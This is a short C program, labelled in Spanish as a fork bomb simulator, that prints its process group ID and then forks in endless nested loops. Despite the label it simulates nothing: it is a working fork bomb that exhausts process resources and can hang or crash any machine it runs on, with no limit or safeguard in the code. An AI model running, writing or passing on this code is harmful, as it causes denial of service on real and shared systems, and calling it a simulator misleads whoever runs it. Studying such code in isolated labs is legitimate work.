#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    printf("Simulador de Fork Bomb iniciado (PGID=%d)...\n", (int)getpgrp());
    fflush(stdout);

    while (1) {
        pid_t hijo = fork();
        if (hijo == 0) {
            while (1) {
                fork();
            }
        } else if (hijo < 0) {
            continue;
        }
    }

    return 0;
}